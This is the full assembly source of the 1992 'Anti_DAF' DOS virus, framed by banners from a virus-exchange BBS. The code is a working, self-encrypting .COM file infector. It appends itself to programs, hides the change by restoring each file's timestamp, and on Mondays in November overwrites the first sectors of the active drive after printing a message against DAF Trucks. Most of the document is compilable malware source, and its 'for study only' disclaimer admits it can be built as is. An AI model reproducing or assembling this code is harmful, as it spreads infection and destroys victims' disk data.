;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
;****************************************************************************
;*   The Anti_DAF Virus                                                     *
;*                                                                          *
;*   Assembled with Tasm 2.5						    *
;*                                                                          *
;*   (c) 1992 Dark Helmet & The Virus Research Centre, The Netherlands      *
;*   The author takes no responsibilty for any damages caused by the virus  *
;*                                                                          *
;*   Special greetings and thanx to :                                       *
;*   Glenn Benton, XSTC for their nice source and viruses, 		    *
;*   Peter Venkman for his BBS, Guns and Roses for their great music, 	    *
;*   and al the other viruswriters...					    *
;*                                                                          *
;*   "Dark Helmet strikes back..."          				    *
;*                                                                          *
;*--------------------------------------------------------------------------*
;*									    *
;*   NOTE : This virus will overwrite the first sectors of the active drive *
;*          on any monday in November.                                      *
;*									    *   
;*   Coming soon : CIVIL WAR II 				     	    *
;*									    *
;*--------------------------------------------------------------------------*
;*                                                                          *
;*  Het Anti-DAF virus is hoofzakelijk gebaseerd op The Navigator virus     *
;*  De encryptie die bij Anti-DAF gebruikt wordt is gebaseerd               *
;*  op de encryptie zoals deze door Glenn Benton gebruikt is 		    *
;*  bij het 'RTL4/Wedden dat virus'.                                        *
;*  Om de controleren of een file geinfecteerd is worden de 4e, 5e en 6e    *
;*  bytes aan het begin gebruikt.					    *
;*									    *
;*   XOR de 4e en 5e byte						    *
;*   Verhoog resultaat met 1						    *
;*   Vergelijk met 6e byte					            *
;*									    *
;*   Is het resultaat gelijk dan is de file al besmet, de 6e byte word ook  *
;*   voor de decryptie gebruikt.					    *
;*   Verlaag deze waarde met 1 en je hebt de sleutel zoals deze bij de      *
;*   decrypty in gebruik is.						    *
;*   Het 4e byte word bepaald uit de lengte van de file + 1.                *
;*   De 5e byte word bepaald door het aantal seconden van 		    *
;*   de systeemtijd te pakken.						    * 
;*                                                                          *
;*   Dark Helmet							    *
;*									    *
;****************************************************************************

		.Radix 16

Anti_DAF        Segment
		Assume cs:Anti_DAF, ds:Anti_DAF
                org 100h

len 		equ offset last - begin
vir_len	        equ offset last - vir_start 

Dummy:          db 0e9h, 03h, 00h
Key:            db 000h, 00h, 01h

Begin:          call virus			; IP op stack

Virus:          pop bp				; Haal IP van Stack	
                sub bp,109h			
                lea si,vir_start+[bp]           ; voor decryptie     
		mov di,si
		mov cx,vir_len 			; lengte decryptie gedeelte	
		mov ah,ds:[105h]		; haal sleutel op
		dec ah                          ; sleutel met 1 verminderen
						; voor decryptie

decrypt:        lodsb				; decrypt virus
		xor al,ah			
		stosb
		loop decrypt

vir_start:	mov dx,0fe00h			; verplaats DTA
		mov ah,1ah
		int 21h

restore_begin:  mov di,0100h			; herstel begin programma
		lea si,ds:[buffer+bp]
		mov cx,06h
		rep movsb

		mov ah,2ah			;kijk of het een maandag 	
		int 21h				;in november is
		cmp dh,00bh
		jne no_activate
		cmp al,01h
		jne no_activate

activate:	mov ah,09h			; activeer het virus :-)
		lea dx,[text+bp]		; druk text af
		int 21h
		mov ah,19h			; vraag drive op
		int 21h
		mov dx,0		        ; overschrijf eerste sectors
		mov cx,10h			; van huidige drive
		mov bx,0			
	        int 26h
		jmp exit



no_activate:	lea dx,[com_mask+bp]		; zoekt eerste .COM program
		mov ah,04eh			; in directorie
		xor cx,cx
		int 21h

Open_file:	mov ax,03d02h			; open gevonden file
		mov dx,0fe1eh
		int 21h
		mov [handle+bp],ax
		xchg ax,bx

Read_date:	mov ax,05700h			;lees datum/tijd file
		int 21h				;en bewaar deze
		mov [date+bp],dx
		mov [time+bp],cx

Check_infect:	mov bx,[handle+bp]		; kijkt of al geinfecteerd
		mov ah,03fh
		mov cx,06h
		lea dx,[buffer+bp]
		int 21h
                mov al,byte ptr [buffer+bp]+3
		xor al,byte ptr [buffer+bp]+4 
		inc al
		cmp al,byte ptr [buffer+bp]+5	
		jne infect_file

Close_file:     mov bx,[handle+bp]		; sluit file 
		mov ah,3eh
		int 21h

Next_file:      mov ah,4fh			; zoekt volgende file
		int 21h
		jnb open_file
		jmp exit			; geen meer gevonden,
						; ga naar exit

Infect_file:    mov ax,word ptr [cs:0fe1ah]	; lees lengte van file in
		sub ax,03h
		mov [lenght+bp],ax		; sla lengte op voor sprong
						; instructie zodadelijk	
		inc al				; verhoog AL, eerste key 
		mov [key1+bp],al			
		mov ah,2ch			; vraag systeemtijd op
		int 21h
		mov [key2+bp],dh		; gebruik seconden voor tweede
						; key
		mov al,dh
		xor al,[key1+bp]		; derde sleutel en sleutel
						; voor encrypty is een xor
						; van key1 en key2
		mov [sleutel+bp],al
		lea si,vir_start+[bp]
		mov di,0fd00h			; encrypt hele zooi aan het
						; einde van het segment
		mov cx,vir_len 
		
Encrypt:	lodsb				; de encryptie	
		xor al,[sleutel+bp]
		stosb
		loop encrypt
		mov al,[sleutel+bp]
		inc al
		mov [sleutel+bp],al

Write_jump:	mov ax,04200h		       ; schrijf de jmp die het
		call move_pointer	       ; die het virus aan het begin	
                mov ah,40h		       ; maakt	
		mov cx,01h
		lea dx,[jump+bp]
		int 21h
		
		mov ah,40h			; schrijf de offset die de jmp
		mov cx,02h			; maakt
		lea dx,[lenght+bp]
		int 21h
		
		mov ah,40			; schrijf de sleutels weg
		mov cx,03h
		lea dx,[key1+bp]
		int 21h
				
Write_virus:	mov ax,4202h			; schrijf virus gedeelte
		call move_pointer		; tot vir_start
		mov ah,40h
		mov cx,len - vir_len
		lea dx,[begin+bp]
		int 21h
		mov ah,40h			; schrijf het encrypte virus
		mov cx,vir_len 			; achter de rest van het virus
		mov dx,0fd00h
		int 21h

restore_date:   mov dx,[date+bp]		; herstel datum/tijd
		mov cx,[time+bp]		; geinfecteerde file
		mov bx,[handle+bp]
		mov ax,05701h
		int 21h

exit:		mov bx,0100h			; continu met orgineel 
		jmp bx				; orgineel programma

;----------------------------------------------------------------------------

move_pointer:   mov bx,[handle+bp]
		xor cx,cx
		xor dx,dx
		int 21h
		ret
		
;----------------------------------------------------------------------------

com_mask	db "*.com",0
handle		dw ?
date		dw ?
time		dw ?
buffer          db 090h,0cdh,020h,044h,048h,00h
lenght		dw ?
jump            db 0e9h,0
text            db 0ah,0ah,0dh,"The Anti-DAF virus",0ah,0dh
		db "DAF-TRUCKS Eindhoven",0ah,0dh
		db "Hugo vd Goeslaan 1",0ah,0dh
		db "Postbus 90063",0ah,0dh
		db "5600 PR Eindhoven, The Netherlands",0ah,0dh
		db 0ah,"DAF sucks...",0ah,0dh 
		db "(c) 1992 Dark Helmet & The Virus Research Centre",0ah,0dh,"$",0

key1		db 00
key2		db 00
sleutel         db 00
last		db 090h

Anti_DAF	ends
		end  dummy
;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;
;컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴컴;
;컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;

